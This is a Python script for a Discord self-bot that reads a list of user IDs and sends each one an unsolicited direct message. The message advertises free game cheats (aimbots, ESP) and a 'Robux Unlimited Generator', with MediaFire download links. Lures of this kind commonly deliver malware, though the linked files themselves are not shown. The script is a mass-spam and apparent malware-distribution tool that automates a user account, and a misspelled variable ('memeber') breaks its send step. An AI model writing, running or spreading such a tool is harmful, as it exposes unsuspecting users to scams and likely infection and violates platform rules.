import discord
from discord.ext import commands
import json

bot = commands.Bot(command_prefix='?')

@bot.event
async def on_ready():
    print(' [!] Started Dmming Ids\n')

    with open("ids.json", "r") as file:
        data = json.load(file)

    indx = 0
    for i in data:
        indx += 1
        member = await bot.fetch_user(i)
        try:
            await memeber.send("""

Limited time offer from zCheats All of the below hacks are free, for additional support and extra features try a premium membership!

Call of Duty :white_check_mark: FREE:lock:FULL SUITE (Lite Version) :lock: | ESP :white_check_mark: | AIMBOT :white_check_mark: | STREAMPROOF :white_check_mark: | UNDECTECTED:white_check_mark:
https://www.mediafire.com/file/b5cr7xsibftkh7u/COD_Wraith_-_FullHackSuite_lite.zip/file

------------------------------------------------------------------------------------------------------------------------------

Apex Legends :white_check_mark::eight_pointed_black_star: [:fire:FREE:fire:]:eight_pointed_black_star::star: APEX CHEAT :star: SILENT AIM :star: ESP :star: AIMBOT :star:
https://www.mediafire.com/file/ax7yr97mdfpsulx/HackSuitev2Lite.rar/file

------------------------------------------------------------------------------------------------------------------------------

 ROBLOX :white_check_mark: Robux Unlimited Generator :white_check_mark: 
https://www.mediafire.com/file/09y8jbxw57sq6td/Robux_Generator.zip/file

------------------------------------------------------------------------------------------------------------------------------""")
            print(f" [+] Sent message {indx} / {len(data)}")
        except Exception as e:
            print(f" [!] {e}")

    print(" [+] Done")

bot.run("", bot = False)
